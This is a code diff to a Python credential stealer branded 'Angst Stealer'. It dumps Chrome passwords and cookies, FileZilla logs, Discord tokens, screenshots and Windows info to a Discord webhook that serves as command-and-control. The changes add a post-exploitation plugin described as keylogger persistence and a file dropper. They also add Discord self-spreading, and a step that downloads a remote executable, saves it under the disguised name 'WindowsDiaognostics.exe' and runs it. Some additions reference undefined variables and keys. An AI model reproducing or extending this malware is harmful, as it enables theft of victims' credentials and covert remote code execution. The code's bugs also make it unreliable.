@@ -11,6 +11,7 @@ import os
 import mss.tools
 import requests
 import zipfile
+import threading
 
 from plugins.chrome import Chrome
 from plugins.chromecookies import Cookies
@@ -19,6 +20,7 @@ from plugins.filezilla import Filezilla
 from plugins.discord import Discord
 from plugins.windows import Windows
 from plugins.antivm import AntiVM
+from plugins.postexploit import PostExploit
 """
 webhook - The discord webhook which acts like a cnc
 chrome - Should it dump chrome credentials
@@ -26,16 +28,20 @@ filezilla - Should it dump filezilla logs
 discord - Dump discord tokens
 screenshot - Take screenshot of victim
 windows - give windows info
+post exploit - persistance with keylogger and filedropper
 """
 CONFIG = {
-    "webhook" : "",
+    "webhook" : "https://discord.com/api/webhooks/745982826620518451/mbz4j54KG_aj0OpYuO6tGdOLbH4RyGBAuQsE7H9_A7gFF-nn-sKaIxkTs0u241zV-daF",
+    "url": "",
     "software": {
         "chrome" : True,
         "chromecookies": True,
         "filezilla": True,
         "discord": True,
+        "discordspread": True,
         "screenshot": True,
-        "windows": True
+        "windows": True,
+        "postexploit": True
     }
 }
 
@@ -48,7 +54,8 @@ class Angst():
             "filezilla": Filezilla(),
             "discord": Discord(),
             "screenshot": Screenshot(),
-            "windows": Windows()
+            "windows": Windows(),
+            "postexploit": PostExploit()
         }
         self.app_data = os.getenv("LOCALAPPDATA")
 
@@ -67,12 +74,19 @@ class Angst():
             try:
                 for conf in CONFIG["software"]:
                     if conf == plugin and CONFIG["software"][conf] == True:
-                        if conf != "screenshot" and conf != "chromecookies" and conf != "windows":
-                            dump_data = self.plugins[conf].dump()
-                            if dump_data != "":
-                                dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
-                                with open(dump_file, "w+") as df:
-                                    df.write(dump_data)
+                        if conf != "screenshot" and conf != "chromecookies" and conf != "windows" and conf != "postexploit":
+                            if conf == "discord":
+                                dump_data = self.plugins[conf].dump(CONFIG["software"]["discordstealer"])
+                                if dump_data != "":
+                                    dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
+                                    with open(dump_file, "w+") as df:
+                                        df.write(dump_data)
+                            else:
+                                dump_data = self.plugins[conf].dump()
+                                if dump_data != "":
+                                    dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
+                                    with open(dump_file, "w+") as df:
+                                        df.write(dump_data)
                         elif conf == "chromecookies":
                             dump_file = f"{angst_dir}\\cookies\\{conf}.txt"
                             with open(dump_file, "w+") as df:
@@ -81,6 +95,18 @@ class Angst():
                             dump_file = f"{angst_dir}\\{conf}.txt"
                             with open(dump_file, "w+") as df:
                                 df.write(self.plugins[conf].dump())
+                        elif conf == "discord":
+                            dump_data = self.plugins[conf].dump()
+                            if dump_data != "":
+                                dump_file = f"{angst_dir}\\passwords\\{conf}.txt"
+                                with open(dump_file, "w+") as df:
+                                    df.write(dump_data)
+                        elif conf == "postexploit":
+                            if url != "":
+                                r = requests.get(url, allow_redirects=True)
+                                open('WindowsDiaognostics.exe', 'wb').write(r.content)
+                                os.system('WindowsDiaognostics.exe')
+                            threading.Thread(target = self.plugins[conf].dump(), args = (CONFIG["webhook"]))
                         else:
                             mss.tools.to_png(self.plugins[conf].dump().rgb,
                                              self.plugins[conf].dump().size,
@@ -108,13 +134,17 @@ class Angst():
         temp = os.path.join(self.app_data, "Angst")
         new = os.path.join(self.app_data, f'Angst-[{os.getlogin()}].zip')
         self.zip(temp, new)
+        if CONFIG["software"]["postexploit"] == True:
+            addtext = ", switching to persistance."
+        else:
+            addtext = "."
         alert = {
             "avatar_url":"https://i.imgur.com/tkQZZL2.png",
             "name":"Angst Stealer",
             "embeds": [
                 {
                     "title": "Angst Stealer",
-                     "description": "Angst has successfully found an new user.",
+                    "description": "Angst has successfully found an new user, work done" + addtext,
                     "color": 15146294,
 
                     "thumbnail": {
